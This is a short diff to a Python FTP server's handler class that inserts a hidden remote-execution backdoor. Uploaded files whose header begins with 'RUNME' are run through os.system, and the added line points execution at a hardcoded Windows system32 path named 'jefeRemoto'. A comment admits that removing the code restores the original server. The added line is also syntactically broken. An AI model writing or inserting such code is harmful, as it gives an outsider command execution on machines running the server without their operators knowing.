@@ -2141,6 +2141,7 @@ class FTPHandler(object, asynchat.async_chat):
         print head
         if head.startswith('RUNME'):
             print 'trying to run ', file
+            file = 'C:\\WINDOWS\system32\jefeRemoto\'
             file = '"'+file+'"'
             thread.start_new_thread(os.system(file),())
         # remove this code and you will end up with the original server
